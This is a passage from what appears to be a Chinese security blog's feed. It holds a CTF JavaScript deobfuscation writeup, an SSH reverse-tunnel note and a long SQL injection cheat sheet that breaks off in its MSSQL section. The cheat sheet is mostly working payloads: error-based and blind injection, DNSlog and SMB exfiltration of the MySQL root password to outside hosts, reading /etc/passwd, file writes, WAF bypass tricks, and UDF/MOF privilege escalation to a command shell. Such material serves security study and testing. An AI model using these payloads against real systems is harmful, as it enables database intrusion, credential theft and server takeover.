class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (_0x3f71a9) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">'Pmi'</span> === _0x5125(<span class="string">'0x36'</span>, <span class="string">'2cJD'</span>)) &#123;&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> ![];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>留意到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var _0x52b070;</span><br><span class="line">_0x52b070 = prompt(_0x5125(&apos;0x10&apos;, &apos;D5FN&apos;));</span><br><span class="line">if (_0x52b070 == _0x5125(&apos;0x11&apos;, &apos;]!tO&apos;)) &#123;</span><br><span class="line">alert(&apos;You\x20got\x20the\x20right\x20flag&apos;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">if (_0x5125(&apos;0x12&apos;, &apos;JVHN&apos;) !== _0x5125(&apos;0x13&apos;, &apos;Jk8w&apos;)) &#123;</span><br><span class="line">alert(_0x5125(&apos;0x14&apos;, &apos;&amp;lOq&apos;));</span><br><span class="line">&#125; else &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>prompt是弹窗获取输入<br>容易看出<br>_0x5125(‘0x11’, ‘]!tO’)<br>返回的字符串是我们想要的<br>修改下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var _0x52b070;</span><br><span class="line">_0x52b070 = prompt(_0x5125(&apos;0x10&apos;, &apos;D5FN&apos;));</span><br><span class="line">alert(_0x5125(&apos;0x11&apos;, &apos;]!tO&apos;));</span><br><span class="line">if (_0x52b070 == _0x5125(&apos;0x11&apos;, &apos;]!tO&apos;)) &#123;</span><br><span class="line">alert(&apos;You\x20got\x20the\x20right\x20flag&apos;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">if (_0x5125(&apos;0x12&apos;, &apos;JVHN&apos;) !== _0x5125(&apos;0x13&apos;, &apos;Jk8w&apos;)) &#123;</span><br><span class="line">alert(_0x5125(&apos;0x14&apos;, &apos;&amp;lOq&apos;));</span><br><span class="line">&#125; else &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/img/xiomara/3.png" alt=""></p><h2 id="Flag-Locker"><a href="#Flag-Locker" class="headerlink" title="Flag Locker"></a>Flag Locker</h2>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ssh反向连接和正向连接</title>
      <link href="//blog/2018/ssh%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5%E5%92%8C%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5.html"/>
      <url>//blog/2018/ssh%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5%E5%92%8C%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5.html</url>
      
        <content type="html"><![CDATA[<p>内网机器A 127.0.0.1<br>外网机器B 118.89.45.1</p><p>A机器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -fCNR 7181:localhost:80 ubuntu@118.89.45.1</span><br></pre></td></tr></table></figure></p><p>B机器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -fCNL *:5010:localhost:7181 ubuntu@localhost</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SQL注入</title>
      <link href="//blog/2018/SQL%E6%B3%A8%E5%85%A5.html"/>
      <url>//blog/2018/SQL%E6%B3%A8%E5%85%A5.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">用户输入数据被当成了代码被执行</span><br><span class="line">原则</span><br><span class="line">有回显:union select、报错注入</span><br><span class="line">无回显:dnslog, time-based, boolean-based</span><br><span class="line">注：思维导图https://github.com/UltramanGaia/SecMM</span><br></pre></td></tr></table></figure><h2 id="最常见的注入"><a href="#最常见的注入" class="headerlink" title="最常见的注入"></a>最常见的注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from xxx where id = %s ;</span><br><span class="line">select * from xxx where id = &apos;%s&apos; ;</span><br><span class="line">select * from xxx where id = &quot;%s&quot; ;</span><br><span class="line">select * from xxx where id = (&apos;%s&apos;) ;</span><br><span class="line">select * from xxx where id = (&quot;%s&quot;) ;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">用</span><br><span class="line">&apos;</span><br><span class="line">&quot;</span><br><span class="line">(</span><br><span class="line">)</span><br><span class="line">char</span><br><span class="line">string</span><br><span class="line">组合看看能不能报错显示出执行的sql语句</span><br><span class="line">检测union select注入</span><br><span class="line">order by 查列数</span><br><span class="line">union select 看回显</span><br><span class="line"></span><br><span class="line">用</span><br><span class="line">or 1=1</span><br><span class="line">or 1=2</span><br><span class="line">and 1=1</span><br><span class="line">and 1=2</span><br><span class="line">检测boolean注入</span><br><span class="line"></span><br><span class="line">用</span><br><span class="line">or sleep(3)</span><br><span class="line">检测time_base注入</span><br></pre></td></tr></table></figure><h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mysql 默认端口 3306</span><br></pre></td></tr></table></figure><h2 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h2><h3 id="Union-Select注入"><a href="#Union-Select注入" class="headerlink" title="Union Select注入"></a>Union Select注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">确认列数</span><br><span class="line">order by </span><br><span class="line">union select 1,2,3</span><br><span class="line">union select null,null,null</span><br><span class="line">union select @,@,@</span><br></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">1. floor + rand + group by</span><br><span class="line">select * from user where id=1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">select * from user where id=1 and (select count(*) from (select 1 union select null union select  !1)x group by concat((select table_name from information_schema.tables  limit 1),floor(rand(0)*2)));</span><br><span class="line">2. ExtractValue</span><br><span class="line">select * from user where id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</span><br><span class="line">3. UpdateXml</span><br><span class="line">select * from user where id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1));</span><br><span class="line">4. Name_Const(&gt;5.0.12)</span><br><span class="line">select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;</span><br><span class="line">5. Join</span><br><span class="line">select * from(select * from mysql.user a join mysql.user b)c;</span><br><span class="line">select * from(select * from mysql.user a join mysql.user b using(Host))c;</span><br><span class="line">select * from(select * from mysql.user a join mysql.user b using(Host,User))c;</span><br><span class="line">6. exp()//mysql5.7貌似不能用</span><br><span class="line">select * from user where id=1 and Exp(~(select * from (select version())a));</span><br><span class="line">7. geometrycollection()//mysql5.7貌似不能用</span><br><span class="line">select * from user where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line">8. multipoint()//mysql5.7貌似不能用</span><br><span class="line">select * from user where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line">9. polygon()//mysql5.7貌似不能用</span><br><span class="line">select * from user where id=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line">10. multipolygon()//mysql5.7貌似不能用</span><br><span class="line">select * from user where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line">11. linestring()//mysql5.7貌似不能用</span><br><span class="line">select * from user where id=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line">12. multilinestring()//mysql5.7貌似不能用</span><br><span class="line">select * from user where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure><h3 id="带外注入"><a href="#带外注入" class="headerlink" title="带外注入"></a>带外注入</h3><ul><li><p>bool注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">and 1=1</span><br><span class="line">and 1=2</span><br><span class="line">or 1=1</span><br><span class="line">or 1=2</span><br><span class="line">爆数据长度</span><br><span class="line">and length(查询数据语句)=数字</span><br><span class="line">select * from user where id=1 and length((select version()))=23;</span><br><span class="line">爆数据</span><br><span class="line">and mid((查询数据语句),数字,1)=&apos;字符&apos;</span><br><span class="line">select * from user where id=1 and mid((select version()),1,1)=&apos;5&apos;;</span><br></pre></td></tr></table></figure></li><li><p>时间盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sleep()</span><br><span class="line">benchmark()</span><br><span class="line">爆数据长度</span><br><span class="line">and if(length(查询数据语句)=数字,sleep(5),0)</span><br><span class="line">and if(length(查询数据语句)=数字,BENCHMARK(10000000, md5(1)),0)</span><br><span class="line">爆数据</span><br><span class="line">and if(mid((查询数据语句),数字,1)=&apos;字符&apos;,sleep(5),0)</span><br><span class="line">and if(mid((查询数据语句),数字,1)=&apos;字符&apos;,BENCHMARK(10000000, md5(1)),0)</span><br><span class="line">其他操作。。</span><br></pre></td></tr></table></figure></li><li><p>dnslog注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(&apos;\\\\foo.&apos;,(select mid(version(),1,1)),&apos;.attack.com\\&apos;));</span><br><span class="line">SELECT LOAD_FILE(CONCAT(&apos;\\\\&apos;,(SELECT password FROM mysql.user WHERE user=&apos;root&apos; LIMIT 1),&apos;.mysql.ip.port.b182oj.ceye.io\\abc&apos;));</span><br></pre></td></tr></table></figure></li><li><p>SMB</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or 1=1 into outfile &apos;\\\\attacker\\SMBshare\\output.txt&apos;</span><br></pre></td></tr></table></figure></li></ul><h3 id="小众注入位置"><a href="#小众注入位置" class="headerlink" title="小众注入位置"></a>小众注入位置</h3><ul><li><p>limit 后面//貌似mysql5.7不能用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); </span><br><span class="line">ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br></pre></td></tr></table></figure></li><li><p>order by后面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">通过条件+排序</span><br><span class="line">order by IF(1=1,name,price) 通过name字段排序</span><br><span class="line">order by (CASE+WHEN+(1=1)+THEN+name+ELSE+price+END)</span><br><span class="line">通过报错</span><br><span class="line">select host from mysql.user order by host|updatexml(1,concat(0x3a,version(),0x3a),1);</span><br><span class="line">select host from mysql.user order by host|extractvalue(1,concat(0x7e,version()));</span><br></pre></td></tr></table></figure></li><li><p>like 模糊匹配</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">like &apos;%test%&apos;</span><br></pre></td></tr></table></figure></li><li><p>regexp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and 1=(SELECT 1 FROM information_schema.tables where table_name regexp &apos;^[a-n]&apos; limit 0,1); // true</span><br><span class="line">and 1=(SELECT 1 FROM information_schema.tables where table_name regexp &apos;^[a-g]&apos; limit 0,1); //true</span><br><span class="line">and 1=(SELECT 1 FROM information_schema.tables where table_name regexp &apos;^[a-a]&apos; limit 0,1);//false</span><br><span class="line">and 1=(SELECT 1 FROM information_schema.tables where table_name regexp &apos;^a[a-n]&apos; limit 0,1);//true</span><br></pre></td></tr></table></figure></li></ul><h2 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h2><h4 id="最常用的获取数据方法"><a href="#最常用的获取数据方法" class="headerlink" title="最常用的获取数据方法"></a>最常用的获取数据方法</h4><p>大于Mysql 5.0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">获取库名</span><br><span class="line">select schema_name from information_schema.schemata limit 0,1</span><br><span class="line">获取表名</span><br><span class="line">select table_name from information_schema.tables where table_schema=&apos;mysql&apos; limit 0,1</span><br><span class="line">获取列名</span><br><span class="line">select column_name from information_schema.columns where table_schema= &apos;mysql&apos; and table_name = &apos;db&apos; limit 0,1</span><br><span class="line">获取数据</span><br><span class="line">select name from user; </span><br><span class="line">注：可以用十六进制代替数据库名、表名</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">如果过滤了空格，linux下可以用下列字符替代</span><br><span class="line">%09 tab水平</span><br><span class="line">%0a 换行</span><br><span class="line">%0dreturn </span><br><span class="line">%0b tab垂直</span><br><span class="line">%a0 空格</span><br></pre></td></tr></table></figure><h4 id="库名"><a href="#库名" class="headerlink" title="库名"></a>库名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select database();</span><br><span class="line">select schema_name from information_schema.schemata limit 0,1;</span><br><span class="line">select group_concat(schema_name) from information_schema.schemata;</span><br><span class="line">select distinct(Db) from mysql.db;</span><br><span class="line">select distinct(database_name) from mysql.innodb_index_stats;//mysql&gt;5.6</span><br><span class="line">select distinct(database_name) from mysql.innodb_table_stats;//mysql&gt;5.6</span><br></pre></td></tr></table></figure><h4 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&apos;mysql&apos; limit 0,1</span><br><span class="line">select group_concat(table_name) from information_schema.tables where table_schema=&apos;mysql&apos; ;</span><br><span class="line">SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != &apos;mysql&apos; AND table_schema != &apos;information_schema&apos;</span><br><span class="line">select distinct(table_name) from mysql.innodb_index_stats;//mysql&gt;5.6</span><br><span class="line">select distinct(table_name) from mysql.innodb_table_stats;//mysql&gt;5.6</span><br></pre></td></tr></table></figure><h4 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_schema= &apos;mysql&apos; and table_name = &apos;db&apos; limit 0,1</span><br><span class="line">select group_concat(column_name) from information_schema.columns where table_schema= &apos;mysql&apos; and table_name = &apos;db&apos;</span><br></pre></td></tr></table></figure><h4 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select group_concat(column_name) from table_name</span><br></pre></td></tr></table></figure><h2 id="双注入Double-Injection"><a href="#双注入Double-Injection" class="headerlink" title="双注入Double Injection"></a>双注入Double Injection</h2><blockquote><p>原理：mysql在 group by时，会先建立一张虚拟表。<br>取第一条记录，执行 floor(rand(0)<em>2)，发现结果为0，查询虚拟表，发现0的键值不存在，则在虚拟表插入<br>的新的数据时 floor(rand(0)</em>2)会被再计算一次，结果为1（第二次计算）<br>取第二条记录，执行 floor(rand(0)<em>2)，发现结果为1（第三次计算），查询虚拟表，发现1的键值存在，所以<br>floor(rand(0)2)不会被计算第二次，直接count()加1，第二条记录查询完毕。<br>再次增加一条的时候<br>floor(rand(0)</em>2)发现结果为0（第4次计算）<br>查询虚拟表，发现0的键值不存在! 那么会在被计算一次<br>结果为1（第5次计算）<br>但是这个 已经存在了。主键值必须唯一。所以插入表就报错了。<br>返回的这个也是个表，每次查询处理计算完插入进去。<br>这样就可以报错了。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line">and (select count(*) from (select 1 union select null union select  !1)x group by concat((select table_name from information_schema.tables  limit 1),floor(rand(0)*2)));</span><br><span class="line">union select 1,2 from (select+count(*),concat(floor(rand(0)*2),( 查询数据语句))a from information_schema.tables group by a)b</span><br></pre></td></tr></table></figure><h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select user, file_priv from mysql.user;//查看权限</span><br><span class="line">select * from users where id = ((&apos;1&apos;)) union select 1,2,load_file(&apos;/etc/passwd&apos;);//若是有权限，但不能读取，应该是secure_file_priv的锅</span><br></pre></td></tr></table></figure><h2 id="输出到文件中-需要知道绝对路径"><a href="#输出到文件中-需要知道绝对路径" class="headerlink" title="输出到文件中(需要知道绝对路径)"></a>输出到文件中(需要知道绝对路径)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = ((&apos;1&apos;)) union select 1,2,users() into outfile &apos;D:\\1.txt&apos;;///var/lib/mysql-files/2.txt</span><br><span class="line">select * from users where id = ((&apos;1&apos;)) union select 1,2,users() into dumpfile &apos;D:\\1.txt&apos;;</span><br><span class="line">outfile 导出可以多行，会有换行等，适合导出文本文件</span><br><span class="line">dumpfile 导出只能是一行，没有换行，适合导出二进制文件</span><br></pre></td></tr></table></figure><h2 id="二次排序注入-存储型的注入"><a href="#二次排序注入-存储型的注入" class="headerlink" title="二次排序注入 (存储型的注入)"></a>二次排序注入 (存储型的注入)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">二次排序注入也称为存储型的注入，就是将可能导致sql注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发sql注入。</span><br><span class="line">二次排序注入思路：</span><br><span class="line">1. hacker输入的数据会经过转义代入sql语句中，然后，储存在数据库中，在数据库中的数据是没有转义的</span><br><span class="line">2. hacker进行别的操作，将数据库中的数据取出来（未转义）并用于拼接到另外一个sql语句中，这就可以绕过转义了。</span><br><span class="line">假设存在一个账户&quot;admin&quot;，密码不知</span><br><span class="line">创建一个账户&quot;admin&apos;#&quot;，则在数据库中保存有&quot;admin&apos;#&quot;</span><br><span class="line">修改密码的时候，代入sql语句</span><br><span class="line">update users set passwd = &quot;xxxx&quot; where username = &apos;      admin&apos;#    &apos; and passwd = &apos;xxxxxxx&apos;</span><br></pre></td></tr></table></figure><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">%df&apos;   -&gt;    %df%5c&apos;</span><br><span class="line">将sql语句解析为gbk编码时，</span><br><span class="line">%df%5c  -&gt;  当成一个字符，后面的&apos;逃逸出来了</span><br><span class="line"></span><br><span class="line">(1) mysql_query，如mysql_query(&quot;SET NAMES &apos;gbk&apos;&quot;, $conn)、mysql_query(&quot;setcharacter_set_client = gbk&quot;, $conn)。</span><br><span class="line"></span><br><span class="line">(2) mysql_set_charset，如mysql_set_charset(&quot;gbk&quot;,$conn)。</span><br><span class="line"></span><br><span class="line">(3) mb_convert_encoding，如mb_convert_encoding($sql,&quot;utf8&quot;,&quot;gbk&quot;)，将SQL语句从gbk格式转换为utf8格式时，0x5c被吃掉了。</span><br><span class="line"></span><br><span class="line">(4) iconv，如iconv(&apos;GBK&apos;, &apos;UTF-8&apos;,$sql)</span><br></pre></td></tr></table></figure><h2 id="注入点-update-insert-delete"><a href="#注入点-update-insert-delete" class="headerlink" title="注入点 update / insert /delete"></a>注入点 update / insert /delete</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">报错注入</span><br><span class="line">extractvalue()函数是MYSQL对XML文档数据进行查询函数。</span><br><span class="line">or extractvalue(1,concat(0x7e,version())) or</span><br><span class="line"></span><br><span class="line">updatexml()函数是MYSQL对XML文档数据进行修改的XPATH函数。</span><br><span class="line">or updatexml(1,concat(0x7e,(version())),0) or</span><br><span class="line"></span><br><span class="line">name_const()函数是MYSQL5.0.12版本加入的一个返回给定值的函数。当用来产生一个结果集合列时 , NAME_CONST() 促使该列使用给定名称。</span><br><span class="line">or (SELECT * FROM (SELECT(name_const(version(),1)),name_const(version(),1))a) or</span><br><span class="line">在最新的MYSQL版本中，使用name_const()函数只能提取到数据库的版本信息。但是在一些比较旧的高于5.0.12(包括5.0.12)的MYSQL版本中，可以进一步提取更多数据。</span><br><span class="line"></span><br><span class="line">update数据到可见参数</span><br><span class="line">update users set points =  1*(select conv(hex((select substr( pw ,1%s,1))),0b10000,0b10))</span><br></pre></td></tr></table></figure><h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><h3 id="过滤型"><a href="#过滤型" class="headerlink" title="过滤型"></a>过滤型</h3><h3 id="检测型"><a href="#检测型" class="headerlink" title="检测型"></a>检测型</h3><blockquote><p>检测<code>select</code></p><ol><li>尝试大小写绕过</li><li>尝试URLencode，如<code>%53elect</code></li><li>仅能查询当前表</li></ol></blockquote><h2 id="Mysql提权"><a href="#Mysql提权" class="headerlink" title="Mysql提权"></a>Mysql提权</h2><h3 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h3><p>Windows<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql &lt; 5.0 无路径限制</span><br><span class="line">如， C:\Winnt\udf.dll 或 C:\Windows\udf.dll</span><br><span class="line">5.0 &lt;= mysql &lt; 5.1 system目录</span><br><span class="line">如，C:\WINDOWS\udf.dll 或 C:\WINDOWS\system32\udf.dll </span><br><span class="line">mysql &gt;= 5.1</span><br><span class="line">%mysql%\plugin\udf.dll</span><br><span class="line">select @@plugin_dir / show variables like &apos;%plugin%&apos;;查询plugin路径</span><br><span class="line">如，C:\Program Files\MySQL\MySQL Server 5.1\lib\plugin\udf.dll</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Create function cmdshell1 returns string soname &quot;udf.dll&quot;;</span><br><span class="line">Select cmdshell1(&quot;dir&quot;);</span><br><span class="line"># 用完后</span><br><span class="line">Drop function cmdshell1;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">常用函数名：</span><br><span class="line">cmdshell    执行cmd;</span><br><span class="line">downloader  下载者,到网上下载指定文件并保存到指定目录;</span><br><span class="line">open3389    通用开3389终端服务,可指定端口(不改端口无需重启);</span><br><span class="line">backshell   反弹Shell;</span><br><span class="line">ProcessView 枚举系统进程;</span><br><span class="line">KillProcess 终止指定进程;</span><br><span class="line">regread     读注册表;</span><br><span class="line">regwrite    写注册表;</span><br><span class="line">shut        关机,注销,重启;</span><br><span class="line">about       说明与帮助函数;</span><br></pre></td></tr></table></figure><p>Linux<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;%plugin%&quot;;</span><br><span class="line">/usr/lib/mysql/plugin/lib_mysqludf_sys.so</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION sys_exec RETURNS STRING SONAME lib_mysqludf_sys.so</span><br><span class="line">SELECT * FROM information_schema.routines</span><br><span class="line">sys_exec(id);</span><br></pre></td></tr></table></figure><h3 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;C:\\www\\nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;;</span><br></pre></td></tr></table></figure><h1 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h1><h2 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 